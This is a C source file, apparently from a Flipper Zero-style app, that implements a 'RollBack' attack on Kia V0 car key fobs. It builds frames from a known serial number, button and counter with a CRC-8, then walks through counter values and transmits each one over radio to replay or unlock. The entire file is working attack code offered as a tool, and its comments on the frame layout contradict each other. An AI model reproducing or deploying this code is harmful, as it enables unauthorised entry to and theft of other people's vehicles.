#include "protopirate_rb.h"

// ===================== RollBack 攻击引擎 =====================
// 基于已知序列号+按钮，枚举计数器进行重放攻击
//
// ===================== rollback_attack_run (旧版阻塞式，向后兼容) =====================

bool rollback_send_single(
    ProtoPirateApp* app,
    uint32_t serial,
    uint8_t button,
    uint16_t counter) {
    uint32_t data_hi, data_lo;
    rollback_build_frame(serial, button, counter, &data_hi, &data_lo);
    return transmit_packet(
        app, data_hi, data_lo, app->frequency, app->rollback.burst_count);
}

bool rollback_attack_run(ProtoPirateApp* app) {
    RollbackState* rs = &app->rollback;
    rs->running = true;

    uint16_t start = rs->base_counter;
    uint16_t end = rs->target_counter;
    uint16_t step = rs->step_size;
    if(step == 0) step = 1;

    int16_t direction = (end > start) ? 1 : -1;
    uint32_t total_steps = abs((int32_t)end - (int32_t)start) / step + 1;
    uint32_t current_step = 0;

    FURI_LOG_I(
        TAG, "RollBack START: cnt 0x%04X -> 0x%04X, step=%u, total=%lu",
        start, end, step, total_steps);

    // Initialize TX hardware for the attack
    if(!tx_init_hw(app, app->frequency)) {
        rs->running = false;
        return false;
    }

    transmit_start(app, app->frequency);

    // Emit counter values from start to end
    for(uint16_t cnt = start;; cnt += direction * step) {
        uint32_t data_hi, data_lo;
        rollback_build_frame(rs->serial, rs->button, cnt, &data_hi, &data_lo);


        transmit_burst(app, data_hi, data_lo);
        furi_delay_ms(30);

        rs->current_counter = cnt;
        current_step++;

        // Check termination
        if((direction > 0 && cnt >= end) ||
           (direction < 0 && cnt <= end)) {
            break;
        }
        if(current_step > 65536) break; // Safety limit
    }

    transmit_stop(app);
    rs->running = false;

    FURI_LOG_I(TAG, "RollBack DONE: %lu frames sent", current_step);
    return true;
}

// ===================== rollback_build_frame (Kia V0 frame builder) =====================
void rollback_build_frame(
    uint32_t serial,
    uint8_t button,
    uint32_t counter,
    uint32_t* data_hi,
    uint32_t* data_lo) {
    // Kia V0 帧格式:
    // [serial:28 bits] + [button:8 bits] + [counter:16 bits] + [crc:8 bits] = 60 bits
    // 填充到 64 位: 高4位 = 0
    
    uint8_t frame[8] = {0};
    
    // Serial (28 bits = 3.5 bytes) stored in frame[0..2] (upper 24 bits) and frame[3] (lower 4 bits)
    frame[0] = (uint8_t)(serial >> 20) & 0xFF;
    frame[1] = (uint8_t)(serial >> 12) & 0xFF;
    frame[2] = (uint8_t)(serial >> 4) & 0xFF;
    frame[3] = (uint8_t)((serial & 0x0F) << 4) | (button & 0x0F);
    
    // Button lower nibble already combined above, but ensure button bits (upper nibble of frame[3])
    frame[4] = (uint8_t)(counter >> 8) & 0xFF;
    frame[5] = (uint8_t)(counter) & 0xFF;
    
    // CRC-8 over first 6 bytes
    uint8_t crc = kia_crc8(frame, 6);
    frame[6] = crc;
    frame[7] = 0x00; // Padding
    
    // Manchester encode? No - raw OOK bits
    // Format all 60 data bits into hi/lo: hi=first 32 bits, lo=next 32 bits
    *data_hi = ((uint32_t)frame[0] << 24) | ((uint32_t)frame[1] << 16) |
               ((uint32_t)frame[2] << 8) | (uint32_t)frame[3];
    *data_lo = ((uint32_t)frame[4] << 24) | ((uint32_t)frame[5] << 16) |
               ((uint32_t)frame[6] << 8) | (uint32_t)frame[7];
}
